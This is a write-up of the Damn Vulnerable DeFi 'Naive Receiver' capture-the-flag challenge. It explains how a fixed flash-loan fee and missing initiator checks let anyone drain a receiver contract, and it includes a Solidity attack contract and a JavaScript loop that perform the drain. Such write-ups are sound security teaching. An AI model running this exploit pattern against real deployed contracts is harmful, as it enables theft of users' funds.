Damn CTF: https://www.damnvulnerabledefi.xyz/challenges/naive-receiver/

solution :

 Challenge Summary
🔐 Goal:
Drain all 10 ETH from a receiver contract (which interacts with a lending pool), without being its owner.

📄 What You’re Given
🏦 1. Naive Lending Pool Contract
Holds 1000 ETH.

Offers flash loans.

Charges a flat fee of 1 ETH per loan, regardless of the loan amount.

Repayment is enforced like this:




require(
    address(this).balance >= balanceBefore + FIXED_FEE,
    "Flash loan hasn't been paid back"
);
👤 2. Receiver Contract
Has 10 ETH balance.

Can receive flash loans from the pool.

Automatically repays loan + fee in its receiveEther() function.

It doesn’t validate who initiates the flash loan!

📌 The Vulnerability
📉 1. Flat Fee Model
Every flash loan costs 1 ETH, no matter how much is borrowed.

Even a 0 ETH loan still costs 1 ETH in fees.

🧨 2. No Authorization
Anyone can call pool.flashLoan(receiver, 0).

The receiver contract automatically handles the repayment using its balance.

💥 Exploitation Strategy
If you — a random attacker — call the pool and tell it to flash loan 0 ETH to the receiver:




naivePool.flashLoan(address(receiver), 0);
It sends 0 ETH to the receiver, which triggers the receiver’s fallback/handler:


function receiveEther(uint256 fee) external payable {
    uint256 amountToBeRepaid = msg.value + fee;
    require(msg.sender == pool);
    pool.sendEtherBack{value: amountToBeRepaid}();
}
It sees msg.value = 0, fee = 1.

It happily sends 1 ETH back to the pool.

The ETH comes out of the receiver’s own balance.

You can repeat this 10 times → receiver balance = 0.

✅ One-Liner Exploit (Looping in a contract)
Here’s the POC exploit in Solidity:



contract AttackNaiveReceiver {
    NaiveReceiverLenderPool public pool;
    address public victim;

    constructor(address _pool, address _victim) {
        pool = NaiveReceiverLenderPool(_pool);
        victim = _victim;
    }

    function attack() external {
        for (uint8 i = 0; i < 10; i++) {
            pool.flashLoan(victim, 0); // Drain 1 ETH per call
        }
    }
}
Alternatively, if you're writing this in a test script:


for (let i = 0; i < 10; i++) {
  await pool.flashLoan(receiver.address, 0);
}
All this works because the receiver doesn’t check who initiated the flash loan, and pays the fee no matter what.

